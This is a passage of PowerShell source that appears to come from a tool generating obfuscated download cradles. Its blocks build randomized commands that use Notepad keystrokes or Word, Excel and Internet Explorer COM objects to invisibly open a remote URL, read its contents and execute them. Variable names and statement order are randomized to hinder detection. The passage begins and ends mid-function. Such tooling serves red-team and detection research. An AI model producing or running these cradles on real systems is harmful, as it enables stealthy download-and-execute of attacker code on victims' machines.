                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable)}"
                        }
                        $CommandArray += "While($GetVar6.Length$LessThanTwoRandom){[$WindowsFormsClipboard]::$ClearClipboard;$SendKeysSyntax;$SleepMilliseconds;$SetVar6([$WindowsFormsClipboard]::$GetText)}"
                        $CommandArray += "[$WindowsFormsClipboard]::$ClearClipboard"

                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'%f'","'x'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable2)}"
                        }
                        $CommandArray += $SendKeysSyntax

                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'{TAB}'","'$SendKeysEnter'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable)}"
                        }
                        $CommandArray += "If($GetProcessRandom|$WhereObjectRandom{$CurrentItemVariable.id$EqualFlagRandom$GetVar7}){$SendKeysSyntax}"

                        # Set Notepad's properties (namely sizing and status bar configurations) back to pre-download state stored in propertiy variable ($GetVar5).
                        # Randomize the order of these properties.
                        $SetItemListTemp = @("'$iWindowPosDX'","'$iWindowPosDY'","'$iWindowPosX'","'$iWindowPosY'","'$StatusBar'")
                        $SetItemList = @()
                        ForEach($Index in $SetItemListIndex_012345)
                        {
                            $SetItemList += $SetItemListTemp[$Index]
                        }
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous Set-ItemProperty commands.
                        $SetItemSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SetItemPropName in $SetItemList)
                            {
                                # Remove single quotes from $SetItemPropName for all usages in this If block.
                                $SetItemPropName = $SetItemPropName.Trim("'")

                                # Encapsulate with parentheses for $SetItemPropName2 if it ends with .Value.
                                $SetItemPropName2 = $SetItemPropName
                                If($SetItemPropName2.EndsWith(').Value'))
                                {
                                    $SetItemPropName2 = "($SetItemPropName2)"
                                }
                                  
                                $SetItemSyntax += "$SetItemProperty$GetVar8 $SetItemPropName $GetVar5.$SetItemPropName2;"
                            }
                            $SetItemSyntax = $SetItemSyntax.Trim(';')
                        }
                        Else
                        {
                            $SetItemPropNameTrimmed = @()
                            ForEach($SetItemPropName in $SetItemList)
                            {
                                # Trim off single quotes for variables.
                                If($SetItemPropName.Contains('('))
                                {
                                    $SetItemPropName = $SetItemPropName.Trim("'")
                                }

                                $SetItemPropNameTrimmed += $SetItemPropName
                            }
                              
                            # Encapsulate with parentheses for $CurrentItemVariable2ForSetItemSyntax if it ends with .Value.
                            $CurrentItemVariable2ForSetItemSyntax = $CurrentItemVariable2
                            If($CurrentItemVariable2ForSetItemSyntax.EndsWith(').Value'))
                            {
                                $CurrentItemVariable2ForSetItemSyntax = "($CurrentItemVariable2ForSetItemSyntax)"
                            }

                            $SetItemSyntax = "@(" + ($SetItemPropNameTrimmed -Join ',') + ")|$ForEachRandom{$SetItemProperty$GetVar8 $CurrentItemVariable $GetVar5.$CurrentItemVariable2ForSetItemSyntax}"
                        }
                        $CommandArray += $SetItemSyntax

                        $SyntaxToInvoke = $GetVar6

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_0123] + $CommandArray[$ArrayIndexOrder_45] + $CommandArray[6..$CommandArray.Length])  -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        11 {
            ################################################
            ## PSCOMWORD - COM Object With Microsoft Word ##
            ################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comWord' # Word COM Object
                    $RandomVarName2 = 'doc'     # Document

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','RuntimeInteropServicesMarshal','Visible2','BooleanFalse','Sleep','Busy','Documents','Open','Content','Text')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Visible2  =  $Visible2.Replace($VarTag1,$GetVar1)
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Documents = $Documents.Replace($VarTag1,$GetVar1)
                        $Content   =   $Content.Replace($VarTag2,$GetVar2)
                        $Text      =      $Text.Replace($VarTag2,$GetVar2).Replace($ContentTag,$Content)
                        $Open      =      $Open.Replace($VarTag1,$GetVar1).Replace($ComMemberTag,$Documents)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag Word.Application"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible2=$BooleanFalse"
                        $CommandArray += "$SetVar2$GetVar1.$Documents.$Open('$Url')"
                          
                        $SyntaxToInvoke = "$GetVar2.$Content.$Text"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','RuntimeInteropServicesMarshal','Visible2','BooleanFalse','Sleep','Busy','Documents','Open','Content','Text')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Visible2  =  $Visible2.Replace($VarTag1,$GetVar1)
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Documents = $Documents.Replace($VarTag1,$GetVar1)
                        $Content   =   $Content.Replace($VarTag2,$GetVar2)
                        $Text      =      $Text.Replace($VarTag2,$GetVar2).Replace($ContentTag,$Content)
                        $Open      =      $Open.Replace($VarTag1,$GetVar1).Replace($ComMemberTag,$Documents)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag Word.Application)"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible2=$BooleanFalse"
                        $CommandArray += "$SetVar2$GetVar1.$Documents.$Open('$Url')"
                          
                        $SyntaxToInvoke = "$GetVar2.$Content.$Text"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                          
                        $CommandArray2 += "$SetVar1`Word.Application"

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag $GetVar1)"
                        $CommandArray2 += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible2=$BooleanFalse"
                        $CommandArray2 += "$SetVar2'$Url'"
                        $CommandArray2 += "$SetVar2$GetVar1.$Documents.$Open($GetVar2)"
                          
                        $SyntaxToInvoke = "$GetVar2.$Content.$Text"

                        $CommandArray2 += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray2 += "$GetVar1.Quit()"
                        $CommandArray2 += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray -Join ';')}
                            2 {$Syntax = (($CommandArray2[$Array2IndexOrder_0123] + $CommandArray2[4,5,6,7,8]) -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        } 
        12 {
            ##################################################
            ## PSCOMEXCEL - COM Object With Microsoft Excel ##
            ##################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comExcel' # Excel COM Object

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 1
                          
                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','RuntimeInteropServicesMarshal','BooleanFalse','DisplayAlerts','Workbooks','Open','Sleep','Busy','JoinNewline','Newline','Sheets','Item','Range','UsedRange','Rows','Count','ValueOrFormula')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $DisplayAlerts  =  $DisplayAlerts.Replace($VarTag1,$GetVar1)
                        $Busy           =           $Busy.Replace($VarTag1,$GetVar1)
                        $Workbooks      =      $Workbooks.Replace($VarTag1,$GetVar1)
                        $Sheets         =         $Sheets.Replace($VarTag1,$GetVar1)
                        $Open           =           $Open.Replace($VarTag1,$GetVar1).Replace($ComMemberTag,$Workbooks)
                        $Item           =           $Item.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets)
                        $Range          =          $Range.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item)
                        $UsedRange      =      $UsedRange.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item)
                        $Rows           =           $Rows.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange)
                        $Count          =          $Count.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange).Replace($RowsTag,$Rows)
                        $ValueOrFormula = $ValueOrFormula.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange).Replace($RowsTag,$Rows)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag Excel.Application"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$DisplayAlerts=$BooleanFalse"
                        $CommandArray += "`$Null=$GetVar1.$WorkBooks.$Open('$Url')"

                        $SyntaxToInvoke = $JoinNewLine.Replace($NewLineTag,$NewLine).Replace($JoinNewLineTag,"($GetVar1.$Sheets.$Item(1).$Range(`"A1:$MZRandom`"+$GetVar1.$Sheets.$Item(1).$UsedRange.$Rows.$Count).$ValueOrFormula|$WhereObjectRandom{$CurrentItemVariable})")
                              
                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                          
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 1
                          
                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','RuntimeInteropServicesMarshal','BooleanFalse','DisplayAlerts','Workbooks','Open','Sleep','Busy','JoinNewline','Newline','Sheets','Item','Range','UsedRange','Rows','Count','ValueOrFormula')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                  
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $DisplayAlerts  =  $DisplayAlerts.Replace($VarTag1,$GetVar1)
                        $Busy           =           $Busy.Replace($VarTag1,$GetVar1)
                        $Workbooks      =      $Workbooks.Replace($VarTag1,$GetVar1)
                        $Sheets         =         $Sheets.Replace($VarTag1,$GetVar1)
                        $Open           =           $Open.Replace($VarTag1,$GetVar1).Replace($ComMemberTag,$Workbooks)
                        $Item           =           $Item.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets)
                        $Range          =          $Range.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item)
                        $UsedRange      =      $UsedRange.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item)
                        $Rows           =           $Rows.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange)
                        $Count          =          $Count.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange).Replace($RowsTag,$Rows)
                        $ValueOrFormula = $ValueOrFormula.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange).Replace($RowsTag,$Rows)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag Excel.Application" + ')'

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$DisplayAlerts=$BooleanFalse"
                        $CommandArray += "`$Null=$GetVar1.$WorkBooks.$Open('$Url')"

                        $SyntaxToInvoke = $JoinNewLine.Replace($NewLineTag,$NewLine).Replace($JoinNewLineTag,"($GetVar1.$Sheets.$Item(1).$Range(`"A1:$MZRandom`"+$GetVar1.$Sheets.$Item(1).$UsedRange.$Rows.$Count).$ValueOrFormula|$WhereObjectRandom{$CurrentItemVariable})")

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        }
        13 {
            #################################################
            ## PSCOMIE - COM Object With Internet Explorer ##
            #################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = (Get-Random -Input @(3,4))}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comIE' # IE COM Object

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 1

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','Navigate','RuntimeInteropServicesMarshal','Visible','BooleanFalse','Silent','BooleanTrue','Sleep','Busy','Document','Body','InnerText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Navigate  =  $Navigate.Replace($VarTag1,$GetVar1)
                        $Visible   =   $Visible.Replace($VarTag1,$GetVar1)
                        $Silent    =    $Silent.Replace($VarTag1,$GetVar1)
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Document  =  $Document.Replace($VarTag1,$GetVar1)
                        $Body      =      $Body.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document)
                        $InnerText = $InnerText.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document).Replace($BodyTag,$Body)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag InternetExplorer.Application"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible=$BooleanFalse"
                        $CommandArray += "$GetVar1.$Silent=$BooleanTrue"
                        $CommandArray += "$GetVar1.$Navigate('$Url')"

                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.

                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comIE' # IE COM Object
                    $RandomVarName2 = 'result' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 1

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    # Fall back to default options for these values since they are in Property array.
                    $NavigateWithTags  = $NavigateWithTags.Replace($Navigate,$NavigateOptions[0])
                    $Navigate          = $NavigateOptions[0]
                    $VisibleWithTags   = $VisibleWithTags.Replace($Visible,$VisibleOptions[0])
                    $Visible           = $VisibleOptions[0]
                    $SilentWithTags    = $SilentWithTags.Replace($Silent,$SilentOptions[0])
                    $Silent            = $SilentOptions[0]

                    # Highlight $PropertyFlag if Rearrange is the option explicitly selected during this execution.
                    Switch($TokenNameUpdatedThisIteration)
                    {
                        'Rearrange' {$PropertyFlagWithTags = '<<<0' + $PropertyFlag + '0>>>'}
                        'Navigate'  {$NavigateWithTags     = '<<<0' + $Navigate     + '0>>>'}
                        'Visible'   {$VisibleWithTags      = '<<<0' + $Visible      + '0>>>'}
                        'Silent'    {$SilentWithTags       = '<<<0' + $Silent       + '0>>>'}
                    }

                    # Throw warning for certain obfsucation options that will not be applied to current syntax arrangement.
                    # For these options back down to default values as long as current syntax arrangement option is selected.
                    If(@('Navigate','Visible','Silent') -Contains $TokenNameUpdatedThisIteration)
                    {
                        Write-Host "`n"
                        Write-Host "WARNING:" -NoNewline -ForegroundColor Yellow
                        Write-Host " We are using" -NoNewLine
                        Write-Host " -Property" -NoNewline -ForegroundColor Cyan
                        Write-Host " in current syntax arrangement.`n         Therefore, all options for" -NoNewline
